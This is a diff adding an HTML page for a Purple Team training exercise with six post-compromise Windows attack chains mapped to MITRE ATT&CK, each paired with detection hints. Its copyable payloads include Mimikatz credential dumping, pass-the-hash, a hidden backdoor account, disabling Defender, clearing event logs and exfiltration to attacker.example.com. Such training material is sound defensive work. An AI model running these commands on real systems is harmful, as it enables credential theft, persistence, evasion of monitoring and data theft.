@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1.0"/>
+<title>Purple Team – Attack Chains</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:'Segoe UI',sans-serif;background:#0f172a;min-height:100vh;color:#e2e8f0;padding:16px}
+h1{font-size:22px;color:#f1f5f9;text-align:center}
+.sub{text-align:center;font-size:13px;color:#64748b;margin:4px 0 20px}
+.badge-header{display:flex;justify-content:center;margin-bottom:8px}
+.badge-header span{background:#1e293b;padding:4px 14px;border-radius:20px;font-size:13px;color:#94a3b8}
+.chain-tabs{display:flex;gap:8px;flex-wrap:wrap;justify-content:center;margin-bottom:16px}
+.chain-tab{padding:7px 14px;border-radius:8px;border:none;cursor:pointer;font-size:12px;font-weight:700;transition:all .2s;color:#94a3b8;background:#1e293b}
+.chain-tab.active{color:#fff}
+.layout{display:grid;grid-template-columns:220px 1fr;gap:14px;max-width:1000px;margin:0 auto}
+.sidebar-title{font-size:11px;color:#475569;font-weight:700;text-transform:uppercase;margin-bottom:6px;padding-left:4px}
+.step-btn{display:block;width:100%;text-align:left;padding:10px 12px;border-radius:8px;border:1px solid #1e293b;background:#1e293b;cursor:pointer;color:#94a3b8;font-size:12px;margin-bottom:8px;transition:all .2s}
+.step-btn.active{color:#f1f5f9}
+.step-tactic{font-weight:700;font-size:10px;margin-bottom:3px}
+.detail{display:flex;flex-direction:column;gap:12px}
+.meta-box{background:#1e293b;border-radius:10px;padding:14px 16px;border-left:3px solid #ccc}
+.tags{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:10px}
+.tag-tactic{padding:3px 10px;border-radius:20px;font-size:11px;font-weight:700}
+.tag-tech{background:#0f172a;color:#94a3b8;padding:3px 10px;border-radius:20px;font-size:11px}
+.info-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px}
+.info-card{background:#0f172a;border-radius:8px;padding:10px 12px}
+.info-label{font-size:10px;color:#64748b;font-weight:700;text-transform:uppercase;margin-bottom:4px}
+.info-val{font-size:13px;color:#e2e8f0}
+.info-val.detect{color:#fbbf24}
+.payload-box{background:#0f172a;border-radius:10px;border:1px solid #1e293b;overflow:hidden}
+.payload-header{display:flex;justify-content:space-between;align-items:center;padding:10px 14px;background:#1e293b}
+.payload-label{font-size:12px;color:#64748b;font-weight:700}
+.copy-btn{padding:4px 12px;border-radius:6px;border:none;cursor:pointer;font-size:11px;font-weight:700;background:#334155;color:#fff;transition:all .2s}
+.copy-btn.copied{background:#10b981}
+pre{margin:0;padding:14px 16px;font-size:12px;line-height:1.7;color:#a3e635;overflow-x:auto;white-space:pre-wrap;word-break:break-word;font-family:'Cascadia Code','Fira Code',monospace}
+.blue-box{background:#172554;border-radius:10px;padding:12px 14px;border:1px solid #1e40af;font-size:12px;color:#93c5fd;line-height:1.6}
+.blue-label{font-size:11px;color:#60a5fa;font-weight:700;text-transform:uppercase;margin-bottom:6px}
+.blue-box strong{color:#fff}
+.blue-box .detect-text{color:#fbbf24;font-weight:600}
+.footer{text-align:center;margin-top:24px;font-size:11px;color:#334155}
+@media(max-width:600px){.layout{grid-template-columns:1fr}.info-grid{grid-template-columns:1fr}}
+</style>
+</head>
+<body>
+
+<div class="badge-header"><span>🎯 Purple Team Exercise · MITRE ATT&CK Framework</span></div>
+<h1>Post-Compromise Attack Chains</h1>
+<p class="sub">Kịch bản mô phỏng tấn công nội bộ sau khi đã compromise 1 máy</p>
+
+<div class="chain-tabs" id="chainTabs"></div>
+
+<div class="layout">
+  <div>
+    <div class="sidebar-title" id="sidebarTitle"></div>
+    <div id="stepList"></div>
+  </div>
+  <div class="detail" id="detail"></div>
+</div>
+
+<div class="footer">⚠️ Chỉ dùng trong môi trường lab/diễn tập được cấp phép · For authorized Purple Team use only</div>
+
+<script>
+const chains=[
+  {id:1,title:"Chain 1: Discovery & Credential Dumping",color:"#f59e0b",icon:"🔍",steps:[
+    {tactic:"Discovery",technique:"T1082 – System Information Discovery",tool:"Built-in CMD/PowerShell",detection:"Sysmon Event ID 1 – process create",payload:`# Enumerate system info\nsysteminfo\nhostname\nwhoami /all\nnet user\nnet localgroup administrators`},
+    {tactic:"Discovery",technique:"T1018 – Remote System Discovery",tool:"net / arp / nmap",detection:"Network scan traffic, Event 4688",payload:`# Discover hosts on network\nnet view /domain\narp -a\n# PowerShell ping sweep\n1..254 | ForEach-Object { Test-Connection -Count 1 -ComputerName "192.168.1.$_" -ErrorAction SilentlyContinue } | Select Address`},
+    {tactic:"Credential Access",technique:"T1003.001 – LSASS Memory Dump",tool:"Mimikatz / ProcDump",detection:"Event 4656/4663 on lsass.exe, Defender alert",payload:`# Via ProcDump (signed MS tool – LOLBin)\nprocdump.exe -accepteula -ma lsass.exe lsass.dmp\n\n# Via Mimikatz (run as SYSTEM/Admin)\nprivilege::debug\nsekurlsa::logonpasswords\nsekurlsa::wdigest`},
+    {tactic:"Credential Access",technique:"T1552.001 – Credentials in Files",tool:"PowerShell / findstr",detection:"File access logs, DLP alerts",payload:`# Search for passwords in files\nfindstr /si "password" *.txt *.xml *.config *.ini\nGet-ChildItem -Recurse -Include *.xml,*.config | Select-String -Pattern "password|pwd|pass"`},
+  ]},
+  {id:2,title:"Chain 2: Privilege Escalation",color:"#ef4444",icon:"⬆️",steps:[
+    {tactic:"Privilege Escalation",technique:"T1055 – Process Injection",tool:"Custom / Metasploit",detection:"Sysmon Event 8 (CreateRemoteThread), Event 10",payload:`# Check for writable services\nsc qc <ServiceName>\naccesschk.exe -uwcqv "Users" *\n\n# PowerShell – find unquoted service paths\nGet-WmiObject Win32_Service | Where-Object { $_.PathName -notlike '"*' -and $_.PathName -like '* *' } | Select Name, PathName`},
+    {tactic:"Privilege Escalation",technique:"T1078 – Token Impersonation",tool:"Mimikatz / Incognito",detection:"Event 4624 logon type 9, 4648",payload:`# Mimikatz token impersonation\ntoken::elevate\ntoken::list\n\n# Check SeImpersonatePrivilege (for Potato attacks)\nwhoami /priv\n\n# PrintSpoofer (if SeImpersonate exists)\nPrintSpoofer.exe -i -c cmd`},
+    {tactic:"Privilege Escalation",technique:"T1068 – Exploitation of Vulnerability (Local)",tool:"WinPEAS / BeRoot",detection:"AV/EDR behavioral detection",payload:`# Run WinPEAS for auto-enumeration\nwinPEASx64.exe > winpeas_output.txt\n\n# Check scheduled tasks writable\nschtasks /query /fo LIST /v | findstr /i "task name\\run as\\status"\n\n# AlwaysInstallElevated check\nreg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated`},
+  ]},
+  {id:3,title:"Chain 3: Lateral Movement",color:"#8b5cf6",icon:"↔️",steps:[
+    {tactic:"Lateral Movement",technique:"T1021.002 – SMB/Windows Admin Shares",tool:"PsExec / Impacket",detection:"Event 4648, 4624 type 3, 5140 share access",payload:`# PsExec lateral movement\nPsExec.exe \\\\\\\\192.168.1.50 -u DOMAIN\\\\admin -p P@ssword123 cmd.exe\n\n# Impacket (from Linux)\npython3 psexec.py DOMAIN/admin:P@ssword123@192.168.1.50\n\n# Net use to mount share\nnet use \\\\\\\\192.168.1.50\\\\C$ /user:DOMAIN\\\\admin P@ssword123`},
+    {tactic:"Lateral Movement",technique:"T1550.002 – Pass-the-Hash",tool:"Mimikatz / CrackMapExec",detection:"Event 4624 type 3 with NTLM, 4625 failures",payload:`# Mimikatz PtH\nsekurlsa::pth /user:Administrator /domain:CORP /ntlm:<NTLM_HASH> /run:cmd.exe\n\n# CrackMapExec spray\ncrackmapexec smb 192.168.1.0/24 -u Administrator -H <NTLM_HASH>\n\n# Impacket wmiexec PtH\npython3 wmiexec.py -hashes :<NTLM_HASH> DOMAIN/Administrator@192.168.1.50`},
+    {tactic:"Lateral Movement",technique:"T1021.006 – WinRM",tool:"Evil-WinRM / PowerShell",detection:"Event 4624 type 3/10, WinRM logs",payload:`# Check WinRM available\nTest-WSMan -ComputerName 192.168.1.50\n\n# PowerShell remote session\nEnter-PSSession -ComputerName 192.168.1.50 -Credential (Get-Credential)\n\n# Evil-WinRM (from Linux)\nevil-winrm -i 192.168.1.50 -u Administrator -p 'P@ssword123'`},
+  ]},
+  {id:4,title:"Chain 4: Persistence",color:"#10b981",icon:"🔒",steps:[
+    {tactic:"Persistence",technique:"T1053.005 – Scheduled Task",tool:"schtasks",detection:"Event 4698/4702 – task created/modified",payload:`# Create scheduled task for persistence\nschtasks /create /tn "WindowsUpdate" /tr "C:\\\\Windows\\\\Temp\\\\beacon.exe" /sc onlogon /ru SYSTEM /f\n\n# Encoded PowerShell payload via task\nschtasks /create /tn "SysCheck" /tr "powershell -enc <BASE64_PAYLOAD>" /sc minute /mo 5 /ru SYSTEM /f\n\n# List all tasks\nschtasks /query /fo LIST /v | findstr /i "task name"`},
+    {tactic:"Persistence",technique:"T1547.001 – Registry Run Keys",tool:"reg.exe / PowerShell",detection:"Sysmon Event 13 – registry set value",payload:`# Add run key\nreg add "HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run" /v "Updater" /t REG_SZ /d "C:\\\\Temp\\\\payload.exe" /f\n\n# PowerShell version\nNew-ItemProperty -Path "HKCU:\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run" -Name "SvcHost32" -Value "C:\\\\Temp\\\\payload.exe" -PropertyType String -Force`},
+    {tactic:"Persistence",technique:"T1136.001 – Create Local Account",tool:"net user",detection:"Event 4720 – account created, 4732 group add",payload:`# Create hidden backdoor account\nnet user backdoor$ P@ssword2024! /add\nnet localgroup Administrators backdoor$ /add\n\n# Hide from login screen (registry)\nreg add "HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\\SpecialAccounts\\\\UserList" /v backdoor$ /t REG_DWORD /d 0 /f`},
+  ]},
+  {id:5,title:"Chain 5: Defense Evasion",color:"#06b6d4",icon:"🥷",steps:[
+    {tactic:"Defense Evasion",technique:"T1562.001 – Disable Security Tools",tool:"PowerShell / sc.exe",detection:"Event 7036 service stopped, 4719 audit policy change",payload:`# Disable Windows Defender (needs admin)\nSet-MpPreference -DisableRealtimeMonitoring $true\nSet-MpPreference -DisableIOAVProtection $true\n\n# Disable Windows Firewall\nnetsh advfirewall set allprofiles state off\n\n# Stop EDR service (example)\nsc stop "SentinelAgent"\nsc config "SentinelAgent" start= disabled`},
+    {tactic:"Defense Evasion",technique:"T1070.001 – Clear Windows Event Logs",tool:"wevtutil",detection:"Event 1102/104 – audit log cleared",payload:`# Clear specific logs\nwevtutil cl System\nwevtutil cl Security\nwevtutil cl Application\n\n# Clear all logs via PowerShell\nGet-EventLog -LogName * | ForEach-Object { Clear-EventLog $_.Log }\n\n# Via wmic\nwmic nteventlog where "LogFileName='Security'" Call ClearEventLog`},
+    {tactic:"Defense Evasion",technique:"T1036.005 – Masquerading (Rename Binary)",tool:"copy / rename",detection:"Sysmon hash mismatch, IMPHASH anomaly",payload:`# Copy malicious binary with legit name\ncopy C:\\\\Temp\\\\beacon.exe C:\\\\Windows\\\\System32\\\\svchost32.exe\n\n# Rename to blend in\nren C:\\\\Temp\\\\mimikatz.exe C:\\\\Temp\\\\svchost.exe\n\n# Execute from unusual path\ncopy cmd.exe %TEMP%\\\\explorer.exe & %TEMP%\\\\explorer.exe`},
+  ]},
+  {id:6,title:"Chain 6: Exfiltration",color:"#f97316",icon:"📤",steps:[
+    {tactic:"Collection",technique:"T1005 – Data from Local System",tool:"PowerShell / robocopy",detection:"File access audit logs, DLP",payload:`# Collect sensitive files\nrobocopy C:\\\\Users\\\\target\\\\Documents C:\\\\Temp\\\\exfil /E /R:0\n\n# PowerShell – find & copy files\nGet-ChildItem -Recurse -Path C:\\\\Users -Include *.docx,*.xlsx,*.pdf | Copy-Item -Destination C:\\\\Temp\\\\exfil\\\\ -Force\n\n# Compress before exfil\nCompress-Archive -Path C:\\\\Temp\\\\exfil -DestinationPath C:\\\\Temp\\\\data.zip`},
+    {tactic:"Exfiltration",technique:"T1048.003 – Exfil over HTTPS",tool:"PowerShell / curl",detection:"Proxy/DLP large HTTPS upload, beacon timing",payload:`# PowerShell upload to attacker server\n$body = [System.IO.File]::ReadAllBytes("C:\\\\Temp\\\\data.zip")\nInvoke-RestMethod -Uri "https://attacker.example.com/upload" -Method POST -Body $body -ContentType "application/octet-stream"\n\n# curl exfil\ncurl -X POST -F "file=@C:\\\\Temp\\\\data.zip" https://attacker.example.com/upload`},
+    {tactic:"Exfiltration",technique:"T1567.002 – Exfil to Cloud Storage",tool:"rclone / aws cli",detection:"DNS for cloud storage, data volume anomaly",payload:`# rclone to attacker-controlled S3/GDrive\nrclone copy C:\\\\Temp\\\\exfil remote:bucket/exfil --config rclone.conf\n\n# AWS CLI (if creds available)\naws s3 cp C:\\\\Temp\\\\data.zip s3://attacker-bucket/data.zip\n\n# (Requires stolen OAuth token for Graph API)`},
+  ]},
+];
+
+let activeChain=0, activeStep=0;
+
+function renderTabs(){
+  const el=document.getElementById('chainTabs');
+  el.innerHTML=chains.map((c,i)=>`<button class="chain-tab${i===activeChain?' active':''}" style="${i===activeChain?`background:${c.color};box-shadow:0 0 12px ${c.color}55`:''}" onclick="selectChain(${i})">${c.icon} ${c.title.replace(/Chain \d+: /,'')}</button>`).join('');
+}
+
+function renderSidebar(){
+  const c=chains[activeChain];
+  document.getElementById('sidebarTitle').textContent=`${c.icon} ${c.title}`;
+  document.getElementById('stepList').innerHTML=c.steps.map((s,i)=>`
+    <button class="step-btn${i===activeStep?' active':''}" style="${i===activeStep?`border-color:${c.color};background:${c.color}22`:''}" onclick="selectStep(${i})">
+      <div class="step-tactic" style="color:${c.color}">${s.tactic}</div>
+      <div>${s.technique}</div>
+    </button>`).join('');
+}
+
+function renderDetail(){
+  const c=chains[activeChain];
+  const s=c.steps[activeStep];
+  document.getElementById('detail').innerHTML=`
+    <div class="meta-box" style="border-left-color:${c.color}">
+      <div class="tags">
+        <span class="tag-tactic" style="background:${c.color}33;color:${c.color}">${s.tactic}</span>
+        <span class="tag-tech">${s.technique}</span>
+      </div>
+      <div class="info-grid">
+        <div class="info-card"><div class="info-label">🛠 Tool / Method</div><div class="info-val">${s.tool}</div></div>
+        <div class="info-card"><div class="info-label">🔔 Detection Signal</div><div class="info-val detect">${s.detection}</div></div>
+      </div>
+    </div>
+    <div class="payload-box">
+      <div class="payload-header">
+        <span class="payload-label">💻 SAMPLE PAYLOAD</span>
+        <button class="copy-btn" id="copyBtn" onclick="copyPayload()">📋 Copy</button>
+      </div>
+      <pre id="payloadPre">${escHtml(s.payload)}</pre>
+    </div>
+    <div class="blue-box">
+      <div class="blue-label">🛡 Blue Team – Detection Hint</div>
+      Monitor: <span class="detect-text">${s.detection}</span><br/>
+      Khuyến nghị: Bật <strong>Sysmon</strong> + <strong>Windows Event Auditing</strong> + forward logs về SIEM để phát hiện kỹ thuật này trong thời gian thực.
+    </div>`;
+}
+
+function escHtml(t){return t.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');}
+
+function copyPayload(){
+  const s=chains[activeChain].steps[activeStep];
+  navigator.clipboard.writeText(s.payload);
+  const btn=document.getElementById('copyBtn');
+  btn.textContent='✅ Copied!';btn.classList.add('copied');
+  setTimeout(()=>{btn.textContent='📋 Copy';btn.classList.remove('copied');},1800);
+}
+
+function selectChain(i){activeChain=i;activeStep=0;render();}
+function selectStep(i){activeStep=i;renderSidebar();renderDetail();}
+function render(){renderTabs();renderSidebar();renderDetail();}
+render();
+</script>
+</body>
+</html>
